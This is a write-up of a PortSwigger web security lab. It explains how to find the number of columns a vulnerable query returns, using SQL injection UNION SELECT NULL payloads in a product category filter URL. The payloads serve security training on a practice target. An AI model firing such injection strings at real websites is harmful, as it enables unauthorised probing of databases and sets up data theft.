# SQL injection UNION attack, determining the number of columns returned by the query

**Lab Url**: [https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

## Objective

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

## Solution

Use a `UNION SELECT` payload with incrementing numbers of `NULL` values to determine the column count. A successful response indicates the correct number of columns; an error means you've exceeded it.

### Step 1: Test with one NULL

```bash
/filter?category=Accessories' UNION SELECT NULL--
```

If this returns an error, the query has more than one column.

### Step 2: Increment until success

Add one `NULL` at a time until the response is successful:

```bash
/filter?category=Accessories' UNION SELECT NULL,NULL--
/filter?category=Accessories' UNION SELECT NULL,NULL,NULL--
```

A successful response (no error, products displayed) confirms the column count. In this lab, the query returns **three columns**.
